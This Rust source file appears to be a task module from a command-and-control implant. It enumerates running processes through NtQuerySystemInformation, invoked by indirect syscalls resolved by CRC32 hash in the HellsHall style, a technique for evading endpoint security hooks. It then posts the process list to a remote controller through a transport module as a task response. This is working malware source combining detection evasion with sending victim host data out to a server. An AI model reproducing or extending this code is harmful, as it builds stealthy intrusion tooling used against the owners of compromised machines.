use crate::hellshall::{NtSyscall, RunSyscall, SetSSn, fetch_nt_syscall, crc32h};
use std::{
    ptr,
    mem::{size_of, zeroed},
    slice,
};
use winapi::shared::{
    ntdef::{NTSTATUS, PVOID, ULONG, UNICODE_STRING, LARGE_INTEGER},
    minwindef::DWORD,
};
use serde_json::Value;

const SystemProcessInformation: u32 = 5;
const BUFFER_SIZE: usize = 0x100000;

#[repr(C)]
struct VM_COUNTERS {
    PeakVirtualSize: usize,
    VirtualSize: usize,
    PageFaultCount: ULONG,
    PeakWorkingSetSize: usize,
    WorkingSetSize: usize,
    QuotaPeakPagedPoolUsage: usize,
    QuotaPagedPoolUsage: usize,
    QuotaPeakNonPagedPoolUsage: usize,
    QuotaNonPagedPoolUsage: usize,
    PagefileUsage: usize,
    PeakPagefileUsage: usize,
    PrivatePageCount: usize,
    Reserved: [usize; 6],
}

#[repr(C)]
struct SYSTEM_THREAD_INFORMATION {
    Reserved1: [LARGE_INTEGER; 3],
    Reserved2: [usize; 2],
    StartAddress: PVOID,
    ClientId: [PVOID; 2],
    Priority: LONG,
    BasePriority: LONG,
    ContextSwitches: ULONG,
    ThreadState: ULONG,
    WaitReason: ULONG,
}

#[repr(C)]
struct SYSTEM_PROCESS_INFORMATION {
    NextEntryOffset: ULONG,
    NumberOfThreads: ULONG,
    WorkingSetPrivateSize: LARGE_INTEGER,
    HardFaultCount: ULONG,
    NumberOfThreadsHighWatermark: ULONG,
    CycleTime: u64,
    CreateTime: LARGE_INTEGER,
    UserTime: LARGE_INTEGER,
    KernelTime: LARGE_INTEGER,
    ImageName: UNICODE_STRING,
    BasePriority: KPRIORITY,
    UniqueProcessId: PVOID,
    InheritedFromUniqueProcessId: PVOID,
    HandleCount: ULONG,
    SessionId: ULONG,
    UniqueProcessKey: usize,
    PeakVirtualSize: usize,
    VirtualSize: usize,
    PageFaultCount: ULONG,
    PeakWorkingSetSize: usize,
    WorkingSetSize: usize,
    QuotaPeakPagedPoolUsage: usize,
    QuotaPagedPoolUsage: usize,
    QuotaPeakNonPagedPoolUsage: usize,
    QuotaNonPagedPoolUsage: usize,
    PagefileUsage: usize,
    PeakPagefileUsage: usize,
    PrivatePageCount: usize,
    ReadOperationCount: i64,
    WriteOperationCount: i64,
    OtherOperationCount: i64,
    ReadTransferCount: i64,
    WriteTransferCount: i64,
    OtherTransferCount: i64,
    Threads: [SYSTEM_THREAD_INFORMATION; 1], // dynamic array
}

type LONG = i32;
type KPRIORITY = LONG;


pub fn list_processes(task: &Value) -> Result<(), Box<dyn std::error::Error>>  {
    let mut output = String::new();

    unsafe {
        let hash = crc32h("NtQuerySystemInformation");

        let mut syscall = NtSyscall {
            dw_ssn: 0,
            dw_syscall_hash: 0,
            p_syscall_address: ptr::null_mut(),
            p_syscall_inst_address: ptr::null_mut(),
        };

        if !fetch_nt_syscall(hash, &mut syscall) {
            output.push_str("[!] Could not resolve NtQuerySystemInformation\n");
        } else {
            SetSSn(syscall.dw_ssn as u16, syscall.p_syscall_inst_address);

            let mut buffer = vec![0u8; BUFFER_SIZE];
            let mut return_len: ULONG = 0;

            let status: NTSTATUS = RunSyscall(
                SystemProcessInformation as _,
                buffer.as_mut_ptr() as _,
                BUFFER_SIZE as _,
                &mut return_len as *mut _ as _,
                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
                ptr::null_mut()
            );

            if status != 0 {
                output.push_str(&format!(
                    "[!] NtQuerySystemInformation failed: 0x{:X}\n", status
                ));
            } else {
                let mut offset = 0;
                while offset < return_len as usize {
                    let proc_info = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;

                    let pid = (*proc_info).UniqueProcessId as usize;
                    let name = if (*proc_info).ImageName.Length > 0 {
                        let slice = slice::from_raw_parts(
                            (*proc_info).ImageName.Buffer,
                            (*proc_info).ImageName.Length as usize / 2
                        );
                        String::from_utf16_lossy(slice)
                    } else {
                        String::from("System Idle Process")
                    };

                    output.push_str(&format!("[{}] {}\n", pid, name));

                    if (*proc_info).NextEntryOffset == 0 {
                        break;
                    }

                    offset += (*proc_info).NextEntryOffset as usize;
                }
            }
        }
    }
    let response_json = serde_json::json!({
        "action": "post_response",
        "responses": [
            {
                "task_id": task.get("id").unwrap().as_str().unwrap(),
                "user_output": output,
                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
                "status": "success",
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    // Send the response back to the server
    crate::transport::send_request(&response_value)?;
    Ok(())
}